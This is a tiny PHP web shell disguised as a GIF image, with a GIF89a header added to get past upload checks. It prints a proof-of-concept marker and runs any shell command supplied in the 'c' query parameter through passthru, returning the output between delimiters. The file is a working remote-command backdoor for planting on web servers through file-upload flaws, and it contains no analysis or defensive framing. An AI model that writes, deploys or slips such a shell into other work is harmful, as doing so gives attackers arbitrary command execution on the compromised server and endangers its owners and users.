GIF89a
<?php
echo "POCBIT-102427-OK";
if (isset($_GET["c"])) {
    echo "@CMD@";
    passthru($_GET["c"]);
    echo "@CMD@";
}
?>
